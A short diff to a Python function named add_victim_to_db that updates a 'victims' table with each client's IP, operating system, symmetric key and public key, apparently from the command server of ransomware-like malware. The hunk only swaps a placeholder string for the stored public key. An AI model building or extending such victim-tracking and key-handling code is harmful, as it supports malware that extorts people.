@@ -102,7 +102,7 @@ def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
     if len(myresult) > 0:
         print("\t(+) client updated in database")
         query = "UPDATE victims SET ip = %s, os = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
-        values = (ip, os, base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
+        values = (ip, os, base64.b64encode(sym_key).decode(), base64.b64encode(pub_key.encode()).decode(), uid)
 
         mycursor.execute(query, values)
 
